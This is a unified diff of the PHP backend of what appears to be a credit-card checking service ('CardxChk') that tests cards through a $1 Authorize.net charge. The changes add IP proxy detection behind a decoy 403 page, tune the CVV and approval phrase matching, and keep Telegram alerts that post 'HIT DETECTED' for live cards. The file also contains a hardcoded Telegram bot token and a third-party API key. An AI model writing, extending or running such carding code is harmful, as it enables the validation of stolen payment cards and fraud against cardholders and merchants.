@@ -1,4 +1,8 @@
 <?php
+// FOR DEBUGGING: If you get a 500 error, uncomment the lines below to see the exact error
+// ini_set('display_errors', 1);
+// error_reporting(E_ALL);
+
 // Set headers to prevent caching
 header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
 header('Cache-Control: post-check=0, pre-check=0', false);
@@ -7,11 +11,11 @@ header('Content-Type: application/json');
 
 // Enable error logging for debugging
 ini_set('log_errors', 1);
-ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
+ini_set('error_log', __DIR__ . '/authnet1$_debug.log');
 
 // --- MOVED log_message function to the top to prevent 500 errors ---
 // Optional file-based logging for debugging
- $log_file = __DIR__ . '/paypal0.1$_debug.log';
+ $log_file = __DIR__ . '/authnet1$_debug.log';
 function log_message($message) {
     global $log_file;
     $timestamp = date('Y-m-d H:i:s');
@@ -141,13 +145,6 @@ try {
     exit;
 }
 
-// Start session for user authentication
-session_start([
-    'cookie_secure' => isset($_SERVER['HTTPS']),
-    'cookie_httponly' => true,
-    'use_strict_mode' => true,
-]);
-
 // Check if this is a GET request and show the HTML page immediately
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     header('Content-Type: text/html; charset=utf-8');
@@ -156,19 +153,123 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     echo '<html style="height:100%"> 
           <head> 
           <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
-          <title>403 Forbidden</title>
+          <title> 403 Forbidden </title>
           <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
           </head> 
           <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
           <div style="height:auto; min-height:100%; "> 
           <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
           <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
-          <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2> 
+          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
           <p>Access to this resource on the server is denied!</p> 
           </div></div></body></html>';
     
     exit;
 }
+
+// --- PROXY DETECTION LOGIC - MOVED TO TOP FOR ALL REQUESTS ---
+
+// Function to get the real user IP address
+function getUserIP() {
+    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'REMOTE_ADDR'];
+    foreach ($ip_keys as $key) {
+        if (array_key_exists($key, $_SERVER) === true) {
+            foreach (explode(',', $_SERVER[$key]) as $ip) {
+                $ip = trim($ip);
+                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
+                    return $ip;
+                }
+            }
+        }
+    }
+    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
+}
+
+// Function to check if IP is a proxy
+function checkProxyIP($ip) {
+    // Check if cURL is available
+    if (!function_exists('curl_init')) {
+        log_message("cURL extension is not installed. Cannot perform proxy check.");
+        return false; // Fail open (allow access) if we can't check
+    }
+
+    $api_url = "https://api.isproxyip.com/v1/check.php?key=zHwDyAMU6bJMIHCKfcDGnjMi7zq3S743dQXWBoqKNPCPEW4z94&ip=" . urlencode($ip) . "&format=json";
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $api_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10-second timeout
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    if ($error) {
+        log_message("Proxy check CURL error for IP $ip: $error");
+        return false; // Fail open on error
+    }
+    
+    if ($http_code !== 200) {
+        log_message("Proxy check HTTP error for IP $ip: Status Code $http_code. Response: $response");
+        return false; // Fail open on error
+    }
+    
+    $data = json_decode($response, true);
+    if (json_last_error() !== JSON_ERROR_NONE || !isset($data['proxy'])) {
+        log_message("Proxy check JSON decode error or missing 'proxy' key for IP $ip. Response: $response");
+        return false; // Fail open on error
+    }
+    
+    // Log the proxy check result
+    log_message("Proxy check result for IP $ip: " . json_encode($data));
+    
+    // Return true if proxy is detected (value > 0)
+    return (int)$data['proxy'] > 0;
+}
+
+// Function to display simple 403 Forbidden page
+function showForbiddenPage() {
+    // Reset content type to HTML
+    header('Content-Type: text/html; charset=utf-8');
+    http_response_code(403);
+    
+    echo '<html style="height:100%"> 
+          <head> 
+          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
+          <title> 403 Forbidden </title>
+          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
+          </head> 
+          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
+          <div style="height:auto; min-height:100%; "> 
+          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
+          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
+          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
+          <p>Access to this resource on the server is denied!</p> 
+          </div></div></body></html>';
+    
+    exit; // Ensure script execution stops completely
+}
+
+// Get user's IP address and check for proxy - FOR ALL REQUESTS
+ $user_ip = getUserIP();
+log_message("Request received from IP: $user_ip");
+
+if (checkProxyIP($user_ip)) {
+    log_message("ACCESS DENIED - Proxy detected for IP: $user_ip");
+    showForbiddenPage();
+    exit; // Double ensure script execution stops
+}
+
+// --- END OF PROXY DETECTION LOGIC ---
+
+// Start session for user authentication
+session_start([
+    'cookie_secure' => isset($_SERVER['HTTPS']),
+    'cookie_httponly' => true,
+    'use_strict_mode' => true,
+]);
 
 // Check if user is authenticated
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
@@ -195,6 +296,7 @@ function is3DAuthenticationResponse($response) {
            strpos($responseUpper, 'REDIRECT') !== false ||
            strpos($responseUpper, 'VERIFICATION_REQUIRED') !== false ||
            strpos($responseUpper, 'ADDITIONAL_AUTHENTICATION') !== false ||
+           strpos($responseUpper, 'AUTHENTICATION_REQUIRED') !== false ||
            strpos($responseUpper, 'CHALLENGE_REQUIRED') !== false;
 }
 
@@ -215,83 +317,78 @@ function formatResponse($response) {
 function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
     global $sent_notifications;
     
-    try {
-        // Create a unique key for this card to prevent duplicates
-        $notification_key = md5($card_details . $status . $response);
-        
-        // Check if we've already sent this notification
-        if (isset($sent_notifications[$notification_key])) {
-            log_message("Skipping duplicate notification for $card_details: $status");
-            return;
-        }
-        
-        // Mark this notification as sent
-        $sent_notifications[$notification_key] = true;
-        
-        // Check both formatted response and original API response for 3DS
-        $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
-        if (is3DAuthenticationResponse($checkResponse)) {
-            log_message("Skipping Telegram notification for 3DS response: $checkResponse");
-            return;
-        }
-        
-        // Only proceed if status is CHARGED or APPROVED
-        if ($status !== 'CHARGED' && $status !== 'APPROVED') {
-            log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
-            return;
-        }
+    // Create a unique key for this card to prevent duplicates
+    $notification_key = md5($card_details . $status . $response);
+    
+    // Check if we've already sent this notification
+    if (isset($sent_notifications[$notification_key])) {
+        log_message("Skipping duplicate notification for $card_details: $status");
+        return;
+    }
+    
+    // Mark this notification as sent
+    $sent_notifications[$notification_key] = true;
+    
+    // Check both formatted response and original API response for 3DS
+    $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
+    if (is3DAuthenticationResponse($checkResponse)) {
+        log_message("Skipping Telegram notification for 3DS response: $checkResponse");
+        return;
+    }
+    
+    // Only proceed if status is CHARGED or APPROVED
+    if ($status !== 'CHARGED' && $status !== 'APPROVED') {
+        log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
+        return;
+    }
 
-        // Load Telegram Bot Token from environment (secure storage)
-        $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A';
-        $chat_id = '-1003204998888'; // Your group chat ID
-        $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
-        $site_link = 'https://cxchk.site';
+    // Load Telegram Bot Token from environment (secure storage)
+    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
+    $chat_id = '-1003204998888'; // Your group chat ID
+    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
+    $site_link = 'https://cxchk.site';
 
-        // Get user info from session
-        $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
-        $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
-        $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
-        $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
-        $gateway = 'Authnet 1$';
-        $formatted_response = formatResponse($response);
+    // Get user info from session
+    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
+    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
+    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
+    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
+    $gateway = 'Authnet 1$'; // Updated for this gateway
+    $formatted_response = formatResponse($response);
 
-        // Construct Telegram message
-        $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
-                   "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
-                   "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
-                   "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
-                   "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
-                   "<b>――――――――――――</b>\n" .
-                   "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
+    // Construct Telegram message
+    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
+               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
+               "<b>――――――――――――</b>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
 
-        // Send to Telegram
-        $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
-        $payload = [
-            'chat_id' => $chat_id,
-            'text' => $message,
-            'parse_mode' => 'HTML',
-            'disable_web_page_preview' => true
-        ];
+    // Send to Telegram
+    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
+    $payload = [
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true
+    ];
 
-        $ch = curl_init($telegram_url);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        $result = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $curl_error = curl_error($ch);
-        curl_close($ch);
+    $ch = curl_init($telegram_url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $result = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curl_error = curl_error($ch);
+    curl_close($ch);
 
-        if ($http_code !== 200 || !$result) {
-            log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
-        } else {
-            log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
-        }
-    } catch (Exception $e) {
-        log_message("Error in sendTelegramNotification: " . $e->getMessage());
+    if ($http_code !== 200 || !$result) {
+        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
+    } else {
+        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
     }
 }
 
@@ -405,7 +502,7 @@ for ($i = 0; $i < 3; $i++) {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Increased timeout
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_multi_add_handle($multi_handle, $ch);
@@ -497,7 +594,7 @@ if (!$valid_response_found) {
     'card code',
     'security code',
     'cvv2',
-    'cvv',
+    'cvc',
     'cvv does not match',
     'security code'
 ];
@@ -526,8 +623,18 @@ foreach ($charged_phrases as $phrase) {
 
 // If not CHARGED, check for APPROVED (CVV related)
 if ($our_status === 'DECLINED') {
-    $is_declined = false;
     foreach ($approved_phrases as $phrase) {
+        if (strpos($message_lower, $phrase) !== false) {
+            $our_status = 'APPROVED';
+            break;
+        }
+    }
+}
+
+// If still DECLINED, confirm with declined phrases or default
+if ($our_status === 'DECLINED') {
+    $is_declined = false;
+    foreach ($declined_phrases as $phrase) {
         if (strpos($message_lower, $phrase) !== false) {
             $is_declined = true;
             break;
@@ -539,10 +646,10 @@ if ($our_status === 'DECLINED') {
 }
 
 // Prepare output message
- $our_message = $message . ($api_status ? (' . ' . $api_status . ')' : '');
+ $our_message = $message . ($api_status ? ' (' . $api_status . ')' : '');
 
 // Record the card check result in the database
-recordCardCheck($GLOBALS['pdo'], $cc, $our_status, $our_message);
+recordCardCheck($GLOBALS['pdo'], $card_number, $our_status, $our_message);
 
 // Send Telegram notification for CHARGED status
 if ($our_status === 'CHARGED') {
